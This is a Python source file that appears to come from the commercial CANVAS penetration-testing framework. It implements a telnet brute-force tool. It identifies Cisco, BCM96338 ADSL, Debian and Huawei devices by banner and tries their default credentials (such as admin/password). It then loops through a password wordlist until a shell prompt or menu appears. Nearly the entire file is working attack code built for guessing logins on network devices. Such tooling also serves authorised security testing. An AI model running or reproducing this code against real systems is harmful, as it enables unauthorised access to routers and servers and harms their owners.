#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


import sys

if "." not in sys.path: sys.path.append(".")

import os
import socket
import select
import time
import libs.ctelnetlib as ctelnetlib

from exploitutils import *
import canvasengine

from tcpexploit import tcpexploit

DESCRIPTION="Telnet Brute Force"
VERSION="1.0"
NAME="telnet_brute"

PROPERTY = {}
#we should really have Brute Force as a section
PROPERTY['TYPE'] = "Tools"

from libs import canvasos
from engine.config import canvas_resources_directory
import os.path

from ExploitTypes.BruteForcer import BruteForcer

class theexploit(BruteForcer):
    def __init__(self, host="localhost", port=23):
        BruteForcer.__init__(self)
        self.host = host
        self.port = port
        self.num_tries = 1
        self.results=""
        self.username="" #no default username
        self.filename=os.path.join(canvas_resources_directory,"passwords.txt")
        self.name=NAME        
        self.set_targets()
        return

    def set_targets(self):
        """Creates our target dictionary"""
        self.targets={}
        #(name, bannerstring, default-user-name, default-password, max-access-attempts, login-prompt, password-prompt, success_strings, ... )
        self.targets[1]=("Cisco", "User Access Verification", "admin","", 3, "Username:", "Password:", ["#","$"]) #Not done yet
        #one thread only on these BMC ADSL routers for some reason!
        self.targets[2]=("BMC96338 ADSL Router", "BCM96338 ADSL Router", "admin", "password", 3, "Login:", "Password:", ["Main Menu"])
        self.targets[3]=("Debian Router","Debian","admin","password",3, "login: ", "assword:", ["#","$"])
        self.targets[4]=("Huawei Router", "Copyright(c) 1998-2007 Huawei Technologies", "admin", "password", 3, "Username:", "Password", ["#","$"])
        return 
    
    def find_triggerstring(self, tn, triggerstrings, max_wait=20):
        """
        Find a trigger string on the socket's data
        """
        self.log("Looking for %s on our telnet connection"%repr(triggerstrings))
        data=""
        found_triggerstring=False 

        for i in xrange(0,max_wait):
            #maximum wait is 10 seconds
            time.sleep(1) #wait one second for more data.
            try:
                #read_eager will raise an EOFError should the connection have closed with no data waiting
                #read 4 packets here
                for j in xrange(0,5):
                    try:
                        data += str(tn.read_eager ())
                    except:
                        self.log("Telnet connection reset during read")
                        break 

                if data.strip().replace("\x00","").replace(" ",""):
                    self.log("Telnet Recved: %s"%data)
            except EOFError:
                self.log("Telnet connection closed...")
                break 
            for triggerstring in triggerstrings:
                if triggerstring in data :
                    self.log("Found %s in our data"%triggerstring) 
                    found_triggerstring=True 
                    break
            if found_triggerstring:
                break 
        if found_triggerstring:
            return triggerstring
        return False 
        
    def init_connection(self):
        """
        Makes the connection using ctelnetlib - we don't do the 
        protocol negotiation here though. That's handled automatically when
        you call read_eager() later.
        
        Returns False or the telnet object
        """
        sck = self.gettcpsock()
        sck.set_timeout(10) #some hosts are REALLY slow to respond
        try:
            sck.connect( (self.host, self.port))
        except:
            self.log("Failed to connect to target!")
            return False 
        
        tn = ctelnetlib.Telnet()
        tn.sock = sck                    
        return tn 
    
            
    def brute_loop(self):
        """
        Runs in one thread and continues until it exchausts the word list. This
        thread will automatically exit if any other thread sets the self.successful_guess 
        variable. 
        
        Likewise, it will exit if it cannot connect to the target.
        """
        newword="Starting"
        while 1:
            if self.state==self.HALT:
                self.log("Halting")
                return 0
            
            if not newword:
                self.log("Finished wordlist")
                break 
            
            tn=self.init_connection()
            if not tn:
                self.log("Failed to connect to target!")
                return 0
            
                
            #maximum password attempts
            max_attempts=3 #remove hardcode later
            login_prompt=self.targets[self.version][5]
            password_prompt=self.targets[self.version][6]
            success_strings=self.targets[self.version][7]
            self.log("Success strings: %s"%repr(success_strings))
            skip_login_prompt=False 
            
            for attempt in xrange(0,max_attempts):
                if not skip_login_prompt:
                    #find first login string
                    found_triggerstring = self.find_triggerstring(tn, triggerstrings=[login_prompt])
                    if not found_triggerstring:
                        self.log("Did not find login prompt!")
                        break 
                skip_login_prompt=False 
                self.log("Sending username: %s"%self.username)
                try:
                    tn.write(self.username)
                    tn.write("\r\x00")
                except socket.error:
                    self.log("Socket closed while writing!")
                    break       

                #look for password prompt
                found_triggerstring = self.find_triggerstring(tn, triggerstrings=[password_prompt])
                if not found_triggerstring:
                    self.log("Did not find password prompt!")
                    break 
                
                #ok, we found our Password: trigger string. 
                newword=self.get_next_word()
                if not newword:
                    break 
                self.log("Sending %s as guess"%newword)
                #write can block when socket is blocked, and can raise socket.error!
                try:
                    tn.write(newword)
                    tn.write("\r\x00")
                except socket.error:
                    self.log("Socket closed while writing!")
                    break 
                found_triggerstring = self.find_triggerstring(tn, triggerstrings=[login_prompt]+success_strings)
                    
                if not found_triggerstring:
                    self.log("Didn't find a successful password trigger string")
                    #try to make another connection
                    continue
                
                if found_triggerstring==login_prompt:
                    self.log("Found login prompt (failed)")
                    skip_login_prompt=True 
                    continue
                
                #otherwise, we found it!
                self.successful_guess=newword
                return True 
        return False 
                
    
    def test(self):
        """
        See what sort of router/telnetd this is. This sets self.version so that we
        have the right brute forcing parameters for later.
        """
        sck = self.gettcpsock()
        sck.set_timeout(10) #some hosts are REALLY slow to respond
        try:
            sck.connect( (self.host, self.port))
        except:
            self.log("Failed to connect to target!")
            return False 
        
        tn = ctelnetlib.Telnet()
        tn.sock = sck
        self.log("Sleeping for 5 seconds to get banner")
        #sleep for five seconds to get banner
        banner=""
        for i in xrange(0,5):
            time.sleep(1)
            banner+=tn.read_eager()

        self.log("Telnet banner recieved: %s"%banner)
        for target_key in self.targets.keys():
            target=self.targets[target_key]
            name=target[0]
            target_banner=target[1]
            if target_banner in banner:
                self.log("Found target: %s"%name)
                self.version=target_key
                if not self.username:
                    self.username=self.targets[self.version][2]
                break 
        return self.version 
    
    def getArgs(self):
        """
        Get the arguments
        """
        BruteForcer.getArgs(self)
        self.host=self.target.interface
        self.getarg("port")
        self.getarg("num_tries")
        if self.argsDict.get("username"):
            #from the GUI, username may be set, but blank.
            self.getarg("username")
        return 
    


if __name__ == "__main__":
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

